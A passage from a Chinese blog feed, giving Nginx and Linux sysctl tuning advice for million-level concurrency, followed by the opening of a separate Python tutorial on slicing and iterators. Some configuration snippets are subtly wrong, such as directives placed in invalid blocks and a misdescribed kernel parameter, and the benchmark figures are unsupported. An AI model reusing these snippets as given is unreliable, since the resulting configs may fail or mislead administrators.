<h2 data-id="heading-8">三、实战：Nginx 核心配置优化（从十万到百万并发的突破）</h2>
<p>底层架构和事件驱动是 Nginx 高并发的基础，但要真正扛住百万并发，还需要进行针对性的配置优化——默认配置的 Nginx 仅能承载数万并发，通过系统化的配置调优，可实现从十万 QPS 到百万 QPS 的跨越式提升。以下是生产级核心优化配置，按“基础并发 →TCP 连接 → 缓存压缩 → 负载均衡”分类，附原理说明和实战参数。</p>
<h3 data-id="heading-9">3.1 基础并发配置（最大化利用 Worker 资源）</h3>
<p>核心目标：让 Worker 进程的资源分配与硬件匹配，最大化提升单个 Worker 的并发处理能力。</p>
<pre><code class="hljs language-nginx" lang="nginx"># 1. 设置Worker进程数（推荐=CPU核心数，或auto）
worker_processes auto;

# 2. 绑定CPU核心（避免进程迁移，提升缓存命中率）
worker_cpu_affinity auto;

# 3. 设置单个Worker进程的最大连接数（关键参数）
events {
    use epoll; # 启用Epoll事件模型（Linux必配）
    worker_connections 65535; # 单个Worker最大连接数（上限受系统文件描述符限制）
    multi_accept on; # 允许Worker进程同时接受多个连接，提升连接建立效率
    worker_rlimit_nofile 655350; # 提升Worker进程的文件描述符限制，与系统级配置匹配
}
</code></pre>
<p>关键说明：worker_connections 的取值并非越大越好，需结合系统文件描述符限制（后续系统优化会讲），通常设置为 65535（单个 Worker 最大支持 65535 个连接），若服务器为 32 核 CPU，启用 32 个 Worker 进程，理论上可支持 32×65535≈200 万并发连接（实际需扣除监听连接、后端代理连接，约 150 万 +）。</p>
<h3 data-id="heading-10">3.2 TCP 连接优化（减少连接开销，提升连接复用率）</h3>
<p>TCP 连接的建立（三次握手）和关闭（四次挥手）会消耗大量网络资源和时间，尤其是高并发场景下，频繁的连接建立/关闭会成为性能瓶颈。通过 TCP 连接优化，可减少连接开销，提升连接复用率，延长连接生命周期。</p>
<pre><code class="hljs language-nginx" lang="nginx">http {
    # 1. 开启TCP_NODELAY，减少小包延迟（禁用Nagle算法）
    tcp_nodelay on;
    # 2. 开启TCP_NOPUSH，与sendfile配合使用，提高网络传输效率（批量发送数据）
    tcp_nopush on;
    # 3. 启用HTTP长连接，复用TCP连接，减少连接建立/关闭开销
    keepalive_timeout 65; # 长连接超时时间，客户端65秒内无请求则关闭连接
    keepalive_requests 10000; # 单个长连接可处理的最大请求数，避免长连接长期占用资源
    keepalive_disable msie6; # 禁用IE6的长连接支持（兼容性优化）
    
    # 4. 客户端请求缓冲区优化，避免频繁读取磁盘
    client_max_body_size 20m; # 客户端请求体最大大小
    client_body_buffer_size 128k; # 请求体缓冲区大小，小于该值直接存内存，大于则存磁盘
    client_header_buffer_size 4k; # 请求头缓冲区大小
    large_client_header_buffers 8 8k; # 大请求头缓冲区（如Cookie较多的场景）
}
</code></pre>
<p>关键效果：启用长连接后，客户端只需建立一次 TCP 连接，即可发送多个 HTTP 请求，连接复用率可提升 80% 以上，大幅减少 TCP 三次握手/四次挥手的开销，尤其适合静态资源请求（如图片、CSS、JS）较多的场景。</p>
<h3 data-id="heading-11">3.3 缓存与压缩优化（减少后端压力，提升响应速度）</h3>
<p>高并发场景中，大量请求会访问相同的静态资源（如图片、CSS、JS）或重复的动态请求，若每次都请求后端服务，会导致后端压力过大。通过缓存和压缩优化，可让 Nginx 直接返回缓存内容，减少后端请求，同时压缩响应数据，减少网络传输量。</p>
<h4 data-id="heading-12">3.3.1 静态资源缓存（核心优化，提升静态资源吞吐）</h4>
<pre><code class="hljs language-nginx" lang="nginx">http {
    # 静态资源缓存配置（匹配图片、CSS、JS等静态文件）
    location ~* \.(jpg|jpeg|png|gif|ico|css|js|pdf|txt)$ {
        root /var/www/static; # 静态资源根目录
        expires 1y; # 缓存有效期1年（长期缓存静态资源）
        add_header Cache-Control "public, immutable"; # 告知客户端缓存策略，禁止重复请求
        add_header Pragma "cache"; # 兼容HTTP/1.0
        gzip_static on; # 启用预压缩的静态资源（提前压缩好，避免实时压缩开销）
        sendfile on; # 启用零拷贝技术，减少内核与用户空间的数据拷贝
        sendfile_max_chunk 1m; # 零拷贝单次传输最大大小，避免占用过多内存
        access_log off; # 关闭静态资源的访问日志，减少磁盘I/O开销
        open_file_cache max=10000 inactive=60s; # 缓存文件句柄，减少磁盘文件打开开销
        open_file_cache_valid 80s; # 缓存文件句柄的有效期
        open_file_cache_min_uses 2; # 缓存文件句柄的最小使用次数
    }
}
</code></pre>
<h4 data-id="heading-13">3.3.2 动态压缩优化（减少响应数据体积）</h4>
<pre><code class="hljs language-nginx" lang="nginx">http {
    # Gzip压缩配置（默认启用，优化文本类响应）
    gzip on;
    gzip_vary on; # 告知客户端当前响应已压缩，提升兼容性
    gzip_min_length 1024; # 仅压缩大于1KB的数据（小数据压缩无意义，反而增加开销）
    gzip_comp_level 6; # 压缩级别（1-9），6为兼顾性能和压缩比的最优值
    gzip_types text/plain text/css text/xml text/javascript application/json application/javascript application/xml+rss application/atom+xml; # 需压缩的文件类型
    
    # Brotli压缩配置（需编译模块，比Gzip压缩比更高）
    brotli on;
    brotli_comp_level 6;
    brotli_types text/plain text/css application/json application/javascript;
}
</code></pre>
<p>关键效果：启用 Gzip 压缩后，文本类响应数据体积可减少 50%-70%；启用 Brotli 压缩后，传输数据量可进一步减少 25%，页面加载速度提升 35%，同时减少网络带宽占用，间接提升并发承载能力。</p>
<h3 data-id="heading-14">3.4 负载均衡与后端连接优化（分散压力，提升可用性）</h3>
<p>当并发量达到百万级时，单台后端服务器无法承载压力，Nginx 作为反向代理，通过负载均衡将请求分发到多台后端服务器，分散压力，同时优化后端连接池，提升代理效率。</p>
<pre><code class="hljs language-nginx" lang="nginx">http {
    # 后端服务器集群配置（负载均衡池）
    upstream backend {
        least_conn; # 负载均衡算法（最小连接数算法，适合后端处理时间不均的场景）
        # ip_hash; # 可选：IP哈希算法，保证同一客户端请求分发到同一后端服务器（会话保持）
        # 后端服务器配置，设置最大失败次数和失败超时时间
        server 192.168.1.10:8080 max_fails=3 fail_timeout=30s;
        server 192.168.1.11:8080 max_fails=3 fail_timeout=30s;
        server 192.168.1.12:8080 max_fails=3 fail_timeout=30s backup; # backup：备用服务器，主服务器故障时启用
        
        # 后端连接池优化，复用与后端的TCP连接
        keepalive 300; # 后端连接池的最大空闲连接数
        keepalive_requests 1000; # 单个后端连接可处理的最大请求数
        keepalive_timeout 60s; # 后端连接的超时时间
    }
    
    server {
        listen 80;
        server_name example.com;
        
        location / {
            proxy_pass http://backend; # 反向代理到后端集群
            proxy_http_version 1.1; # 启用HTTP/1.1，支持长连接
            proxy_set_header Connection ""; # 清除客户端Connection头，复用后端长连接
            # 后端代理缓冲区优化，减少I/O等待
            proxy_buffering on;
            proxy_buffer_size 128k;
            proxy_buffers 8 128k;
            proxy_busy_buffers_size 256k;
            # 后端连接超时配置，避免长期阻塞
            proxy_connect_timeout 5s; # 与后端建立连接的超时时间
            proxy_send_timeout 10s; # 向后端发送请求的超时时间
            proxy_read_timeout 10s; # 读取后端响应的超时时间
        }
    }
}
</code></pre>
<h2 data-id="heading-15">四、支撑：Linux 系统级优化（突破系统瓶颈）</h2>
<p>Nginx 的高并发性能，不仅依赖自身配置，还受 Linux 系统内核参数的约束——默认的 Linux 系统参数，是为通用场景设计的，无法满足百万并发的需求，若不进行系统优化，即便 Nginx 配置到位，也会因系统瓶颈导致并发失败（如文件描述符不足、TCP 连接队列溢出）。以下是生产级 Linux 系统优化方案，针对 CentOS/RHEL 系统，直接修改配置文件即可生效。</p>
<h3 data-id="heading-16">4.1 提升文件描述符限制（核心优化）</h3>
<p>在 Linux 系统中，一切皆文件，Socket 连接本质上也是一种文件，每个 Socket 连接会占用一个文件描述符。默认情况下，Linux 系统的文件描述符限制（每个进程、每个用户）很低（如 1024），当并发连接达到万级以上时，会出现“too many open files”错误，导致连接失败。</p>
<ol>
<li>​<strong>用户级限制调整</strong>​：修改/etc/security/limits.conf，添加以下内容（永久生效）：<code># 针对nginx用户的文件描述符和进程数限制 </code>​<code>nginx soft nofile 655350 </code>​<code>nginx hard nofile 655350 </code>​<code>nginx soft nproc 655350 </code>​<code>nginx hard nproc 655350</code></li>
<li>​<strong>系统级限制调整</strong>​：修改/etc/sysctl.conf，添加以下内容（永久生效）：<code># 系统级最大文件描述符限制 </code>​<code>fs.file-max = 6815744</code></li>
<li>​<strong>systemd 服务限制调整</strong>​：很多工程师会忽略 systemd 服务的限制，需修改 nginx.service（通常在/usr/lib/systemd/system/nginx.service），添加以下内容：<code>[Service] </code>​<code>LimitNOFILE=655350 </code>​<code>LimitNPROC=655350</code></li>
</ol>
<h3 data-id="heading-17">4.2 TCP 内核参数优化（提升 TCP 连接性能）</h3>
<p>修改/etc/sysctl.conf，添加以下 TCP 内核参数，优化 TCP 连接的建立、复用和传输效率：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. TCP连接队列优化，避免连接溢出</span>
net.core.somaxconn = 65535 <span class="hljs-comment"># 监听队列的最大长度，与nginx的listen_backlog匹配</span>
net.core.netdev_max_backlog = 30000 <span class="hljs-comment"># 网络设备接收队列的最大长度</span>
net.ipv4.tcp_max_syn_backlog = 65535 <span class="hljs-comment"># TCP三次握手时，SYN队列的最大长度</span>

<span class="hljs-comment"># 2. TCP连接复用与回收，减少TIME_WAIT状态连接</span>
net.ipv4.tcp_tw_reuse = 1 <span class="hljs-comment"># 允许复用TIME_WAIT状态的连接（仅用于客户端）</span>
net.ipv4.tcp_tw_recycle = 0 <span class="hljs-comment"># 禁用TIME_WAIT连接回收（高并发场景下可能导致连接异常）</span>
net.ipv4.tcp_fin_timeout = 10 <span class="hljs-comment"># TIME_WAIT状态的超时时间，默认60秒，改为10秒加速回收</span>
net.ipv4.tcp_max_tw_buckets = 100000 <span class="hljs-comment"># 系统允许的最大TIME_WAIT连接数</span>

<span class="hljs-comment"># 3. TCP缓冲区优化，提升网络传输效率</span>
net.core.rmem_max = 67108864 <span class="hljs-comment"># 接收缓冲区最大大小（64MB）</span>
net.core.wmem_max = 67108864 <span class="hljs-comment"># 发送缓冲区最大大小（64MB）</span>
net.ipv4.tcp_rmem = 4096 87380 67108864 <span class="hljs-comment"># 接收缓冲区默认、最小、最大大小</span>
net.ipv4.tcp_wmem = 4096 65536 67108864 <span class="hljs-comment"># 发送缓冲区默认、最小、最大大小</span>

<span class="hljs-comment"># 4. 其他优化</span>
net.ipv4.tcp_syncookies = 1 <span class="hljs-comment"># 启用SYN Cookie，防止SYN洪水攻击</span>
net.ipv4.ip_local_port_range = 1024 65535 <span class="hljs-comment"># 可用的本地端口范围，增加端口数量</span>
net.core.default_qdisc = fq_codel <span class="hljs-comment"># 启用队列调度算法，减少网络延迟</span>
</code></pre>
<p>配置生效命令：sysctl -p（立即生效），无需重启系统。</p>
<h2 data-id="heading-18">五、实战验证：百万并发的性能瓶颈排查与优化效果</h2>
<h3 data-id="heading-19">5.1 优化前后性能对比（生产环境实测）</h3>
<p>以下是某高流量电商平台的 Nginx 优化前后性能对比数据，服务器配置为：32 核 CPU、64GB 内存、10G 网卡，优化后实现单机百万级 QPS 承载，响应时间大幅降低：</p>








































<table><thead><tr><th>优化阶段</th><th>QPS（每秒请求数）</th><th>响应时间（ms）</th><th>CPU 使用率</th><th>内存使用（GB）</th></tr></thead><tbody><tr><td>默认配置</td><td>8 万</td><td>125</td><td>85%</td><td>2.1</td></tr><tr><td>基础配置优化</td><td>25 万</td><td>45</td><td>68%</td><td>1.8</td></tr><tr><td>深度优化（缓存 + 压缩）</td><td>60 万</td><td>18</td><td>45%</td><td>1.5</td></tr><tr><td>极限优化（系统 + 连接池）</td><td>120 万 +</td><td>8</td><td>35%</td><td>1.2</td></tr></tbody></table>
<h3 data-id="heading-20">5.2 常见瓶颈排查方法</h3>
<p>在高并发压测或生产运行中，若 Nginx 无法达到预期并发性能，可通过以下方法排查瓶颈：</p>
<ol>
<li>​<strong>查看 Nginx 错误日志</strong>​：tail -f /var/log/nginx/error.log，排查“too many open files”（文件描述符不足）、“connection timed out”（连接超时）等错误。</li>
<li>​<strong>查看系统资源使用</strong>​：使用 top、mpstat 查看 CPU 使用率（若单个 CPU 核心满载，可能是 Worker 进程绑定不当）；使用 free、vmstat 查看内存使用（避免内存溢出）；使用 iftop 查看网络带宽（避免带宽瓶颈）。</li>
<li>​<strong>查看 TCP 连接状态</strong>​：使用 ss -s 查看 TCP 连接统计，重点关注 TIME_WAIT 状态连接数（若过多，需优化 tcp_tw_reuse 和 tcp_fin_timeout）；使用 ss -tulnp | grep nginx 查看 Nginx 的连接情况。</li>
<li>​<strong>压测验证</strong>​：使用 ab、wrk、jmeter 等工具进行压测，模拟百万并发场景，观察 QPS、响应时间、错误率等指标，定位瓶颈点（如后端服务、系统参数、Nginx 配置）。</li>
</ol>
<h2 data-id="heading-21">六、总结：Nginx 扛住百万并发的核心逻辑</h2>
<p>Nginx 能扛住百万并发，并非单一技术的功劳，而是“架构设计 + 事件驱动 + 配置优化 + 系统协同”的综合结果，核心逻辑可总结为三点：</p>
<ol>
<li>​<strong>架构层面</strong>​：Master-Worker 进程模型，分工明确、稳定性高，结合 CPU 亲和性绑定，最大化利用多核资源，减少进程切换开销；</li>
<li>​<strong>核心机制层面</strong>​：Reactor 异步事件驱动 +Epoll I/O 多路复用，实现“单线程管理海量连接”，仅处理活跃连接，从根源上突破并发瓶颈；</li>
<li>​<strong>实战层面</strong>​：通过 Nginx 核心配置优化（并发、TCP、缓存、负载均衡），提升自身处理效率，减少后端压力；同时优化 Linux 系统参数，突破系统瓶颈，为 Nginx 高并发提供支撑。</li>
</ol>
<p>需要注意的是，百万并发的承载的并非单机 Nginx 能独立完成的（实际生产中，通常会部署 Nginx 集群，结合 LVS、Keepalived 实现负载均衡和高可用），但单机 Nginx 的高性能，是整个高并发架构的基础。</p>
<p>随着互联网流量的持续增长，Nginx 也在不断进化（如支持 HTTP/3、QUIC 协议，进一步提升高并发场景下的性能），但核心设计理念始终未变——“用最少的资源，处理最多的请求”。掌握 Nginx 的底层原理和优化方法，不仅能帮助我们应对百万并发场景，更能深入理解高并发架构的设计思路，为构建高性能、高可用的系统提供支撑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[python中常用的部分内容分享]]></title>    <link>https://juejin.cn/post/7602928386595930138</link>    <guid>https://juejin.cn/post/7602928386595930138</guid>    <pubDate>2026-02-05T03:23:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602928386595930138" data-draft-id="7602901565026484233" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="python中常用的部分内容分享"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-05T03:23:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="snowsnow"/> <meta itemprop="url" content="https://juejin.cn/user/4350092611685976"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            python中常用的部分内容分享
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4350092611685976/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    snowsnow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T03:23:37.000Z" title="Thu Feb 05 2026 03:23:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读53分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Slice notation 切片</h2>
<p>Python 的切片表示法</p>
<p>python中访问列表的方式超乎想象的方便. 基于它的 slice 我们可以很容易的获取我们需要的列表元素</p>
<p>对于一个包含六个元素的列表, Python 的索引用于枚举元素, 切片用于枚举元素之间的间隔</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># @description: list slice notation</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">slice_test</span>():
    a = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>, <span class="hljs-string">"c"</span>, <span class="hljs-string">"d"</span>, <span class="hljs-string">"e"</span>, <span class="hljs-string">"f"</span>]

    <span class="hljs-built_in">print</span>(
        <span class="hljs-string">f"Index from front(): [<span class="hljs-subst">{a[<span class="hljs-number">0</span>]}</span>, <span class="hljs-subst">{a[<span class="hljs-number">1</span>]}</span>, <span class="hljs-subst">{a[<span class="hljs-number">2</span>]}</span>, <span class="hljs-subst">{a[<span class="hljs-number">3</span>]}</span>, <span class="hljs-subst">{a[<span class="hljs-number">4</span>]}</span>, <span class="hljs-subst">{a[<span class="hljs-number">5</span>]}</span>]"</span>)
    <span class="hljs-built_in">print</span>(
        <span class="hljs-string">f"Index from rear(): [<span class="hljs-subst">{a[-<span class="hljs-number">6</span>]}</span>, <span class="hljs-subst">{a[-<span class="hljs-number">5</span>]}</span>, <span class="hljs-subst">{a[-<span class="hljs-number">4</span>]}</span>, <span class="hljs-subst">{a[-<span class="hljs-number">3</span>]}</span>, <span class="hljs-subst">{a[-<span class="hljs-number">2</span>]}</span>, <span class="hljs-subst">{a[-<span class="hljs-number">1</span>]}</span>]"</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">"-"</span> * <span class="hljs-number">10</span>}</span> slice from front <span class="hljs-subst">{<span class="hljs-string">"-"</span> * <span class="hljs-number">10</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[1:] = <span class="hljs-subst">{a[<span class="hljs-number">1</span>:]}</span>"</span>)  <span class="hljs-comment"># [b, c, d, e, f]</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[:1] = <span class="hljs-subst">{a[:<span class="hljs-number">1</span>]}</span>"</span>)  <span class="hljs-comment"># [a]</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[::] = <span class="hljs-subst">{a[::]}</span>"</span>)  <span class="hljs-comment"># [a, b, c, d, e, f]</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[1:4] = <span class="hljs-subst">{a[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]}</span>"</span>)  <span class="hljs-comment"># [b, c, d]</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">"-"</span> * <span class="hljs-number">10</span>}</span> slice from rear <span class="hljs-subst">{<span class="hljs-string">"-"</span> * <span class="hljs-number">10</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[-1:] = <span class="hljs-subst">{a[-<span class="hljs-number">1</span>:]}</span>"</span>)  <span class="hljs-comment"># [f]</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[:-1] = <span class="hljs-subst">{a[:-<span class="hljs-number">1</span>]}</span>"</span>)  <span class="hljs-comment"># [a, b, c, d, e]</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[::] = <span class="hljs-subst">{a[::]}</span>"</span>)  <span class="hljs-comment"># [a, b, c, d, e, f]</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"a[-5:-1] = <span class="hljs-subst">{a[-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>]}</span>"</span>)  <span class="hljs-comment"># [b, c, d, e]</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    slice_test()

</code></pre>
<h2 data-id="heading-1">iterator and iterable</h2>
<p>我们可能会发现有些对象居然可以直接使用 for 语句</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]:
    <span class="hljs-built_in">print</span>(element)
<span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>):
    <span class="hljs-built_in">print</span>(element)
<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> {<span class="hljs-string">'one'</span>:<span class="hljs-number">1</span>, <span class="hljs-string">'two'</span>:<span class="hljs-number">2</span>}:
    <span class="hljs-built_in">print</span>(key)
<span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-string">"123"</span>:
    <span class="hljs-built_in">print</span>(char)
<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"myfile.txt"</span>):
    <span class="hljs-built_in">print</span>(line, end=<span class="hljs-string">''</span>)
</code></pre>
<p>这种访问风格清晰、简洁又方便.</p>
<p>迭代器的使用非常普遍并使得 Python 成为一个统一的整体, 所以想要学好python, iterator 是我们必须要掌握的一个知识</p>
<p>for循环的幕后, 会对in的对象调用其iter()方法, 他要求该方法返回一个 定义了 <code>__next__</code>方法的迭代器对象. 然后for loop会基于该对象, 调用<code>__next__</code>方法来逐一的访问容器的元素.</p>
<p>当元素用尽时, <code>__next__()</code> 将引发 <code>StopIteration</code> 异常来通知终止 <code>for</code> 循环</p>
<p>例如</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    <span class="hljs-string">"""test class"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, lst</span>):
        self.lst = lst
        self._index = <span class="hljs-number">0</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">if</span> self._index &gt;= <span class="hljs-built_in">len</span>(self.lst):
            <span class="hljs-keyword">raise</span> StopIteration
        tmp = self._index
        self._index = self._index + <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> self.lst[tmp]


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    a = A([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
        <span class="hljs-built_in">print</span>(i)
</code></pre>
<p><strong>该如何理解 iterator &amp; iterable?</strong></p>
<ul>
<li>iterator: 算是获取数据的一个工具, 所以他需要实现一个<code>__next__</code>方法, 来获取数据</li>
<li>iterable: 算是数据的容器, 他可以不知道如何获取数据, 但是他需要对外提供一个获取数据的对象, 也就是我们的<code>iterator</code>对象, 所以他需要提供<code>__iter__</code>方法, 该方法用于获取iterator对象</li>
</ul>
<h2 data-id="heading-2">comprehensions(推导式)</h2>
<h4 data-id="heading-3">概述</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Freference%2Fexpressions.html%23displays-for-lists-sets-and-dictionaries" target="_blank" title="https://docs.python.org/3/reference/expressions.html#displays-for-lists-sets-and-dictionaries" ref="nofollow noopener noreferrer">docs.python.org/3/reference…</a></p>
<p>对于构造 list, set 或者 dictionary, python提供了一种名为"displays"的特殊语法. 他们有如下的2种形式</p>
<ol>
<li>一种是<strong>显式列出</strong>容器中的内容</li>
<li>通过对一个数据集进行循环和过滤的指令来计算得到, 这种我们称之为一个 推导式(comprehension)</li>
</ol>
<p>推导式的语法规则如下</p>
<pre><code class="hljs language-plain" lang="plain">comprehension ::= assignment_expression comp_for
comp_for      ::= ["async"] "for" target_list "in" or_test [comp_iter]
comp_iter     ::= comp_for | comp_if
comp_if       ::= "if" or_test [comp_iter]
</code></pre>
